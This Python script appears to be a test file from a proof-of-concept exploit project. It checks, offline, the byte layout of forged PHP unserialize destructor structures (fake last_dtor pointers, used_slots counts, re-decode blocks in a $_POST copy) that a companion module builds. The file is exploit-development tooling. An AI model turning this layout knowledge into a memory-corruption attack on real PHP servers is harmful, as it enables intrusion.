#!/usr/bin/env python3 -I
"""Byte-layout verifier for last_dtor_forge.py (offline; no lab needed).

Asserts forge_last_dtor_value's two shapes: probe mode (layout=None) plants the
magic last_dtor at val[16:24] over a 'G'-filled buffer; layout mode writes the
decode-1 fakes over A and the re-decode fakes inside the live $_POST copy, at the
documented offsets (A->last/last_dtor, FA/FE/FD blocks, used_slots counts).

    python3 -I poc/primitives/write/verify_last_dtor_forge.py
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write import last_dtor_forge as L  # noqa: E402


def q(b, o):
    return struct.unpack_from("<Q", b, o)[0]


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True

    print("## probe mode (layout=None): magic last_dtor over 'G' fill")
    size = 1024
    v = L.forge_last_dtor_value(size, None)
    ok &= check("length = size", len(v) == size)
    ok &= check("val[0:16] = 'G'*16", bytes(v[0:16]) == b"G" * 16)
    ok &= check("val[16:24] = magic 0x5151515151515151", q(v, 16) == 0x5151515151515151)
    ok &= check("tail still 'G' fill", bytes(v[24:]) == b"G" * (size - 24))

    print("## layout mode: decode-1 + re-decode fakes at documented offsets")
    # Addresses chosen so the module's %16/divmod asserts resolve to k1=24, fd=768.
    a = 0x10000
    copy = 0x20000
    t1 = a + 88          # (t1-a-24)%16==0 -> k1=24, s1=3
    t2 = copy + 888      # (t2-...)%16==0 -> fd=768, s2=5
    v = L.forge_last_dtor_value(size, (a, copy, t1, t2), verbose=False)

    k1 = 24
    fd = L.FD_BASE       # 768
    fake_e2 = copy + 24 + L.FE
    fake_d2 = copy + 24 + fd

    ok &= check("A->last @0x00 = a+64", q(v, 0) == a + 64)
    ok &= check("fake_e1.used_slots @0x40 = 0", q(v, 64) == 0)
    ok &= check("A->last_dtor @0x10 = a+k1", q(v, 16) == a + k1)
    ok &= check("fake_d1.used_slots @k1(24) = s1(3)", q(v, k1) == 3)
    ok &= check("re-decode last @FA(256) = fake_e2", q(v, L.FA) == fake_e2)
    ok &= check("re-decode first_dtor @FA+8 = 0", q(v, L.FA + 8) == 0)
    ok &= check("re-decode last_dtor @FA+16 = fake_d2", q(v, L.FA + 16) == fake_d2)
    ok &= check("max_depth @FA+48 = 0", q(v, L.FA + 48) == 0)
    ok &= check("fake_e2.used_slots @FE(512) = 0", q(v, L.FE) == 0)
    ok &= check("fake_d2.used_slots @fd(768) = s2(5)", q(v, fd) == 5)
    ok &= check("untouched region still 'G'", bytes(v[1000:1008]) == b"G" * 8)

    print("\n==== verify_last_dtor_forge: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
